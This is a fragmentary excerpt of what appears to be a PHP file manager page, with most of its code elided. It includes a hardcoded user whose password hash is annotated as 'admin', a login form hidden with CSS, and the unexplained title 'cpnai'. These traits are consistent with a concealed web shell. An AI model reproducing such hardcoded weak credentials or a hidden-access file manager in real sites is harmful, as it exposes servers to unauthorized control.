...
$auth_users = array(
    ...
    'user' => '21232f297a57a5a743894a0e4a801fc3', //admin
);
...
if ($use_auth) {
    if (isset($_SESSION['logged'], $auth_users[$_SESSION['logged']])) {
        ...
        fm_show_message();
        ?>
        <div style="visibility: hidden" class="path login-form">
...
<meta charset="utf-8">
<title>cpnai</title>
<meta name="Description" CONTENT=" PHP File Manager">
...
.preview-img{
    max-width:100%;
    background:url(
    data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC
    )
}
.inline-actions>a>i{
    font-size:1em;
...
.preview-img{
    ...
    base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC)
}
.inline-actions>a>i{
    font-size:1em;
    margin-left:5px;
...
<script>
function newfolder(e){var t=document.getElementById("newfilename").value,n=document.querySelector('input[name="newfile"]:checked').value;
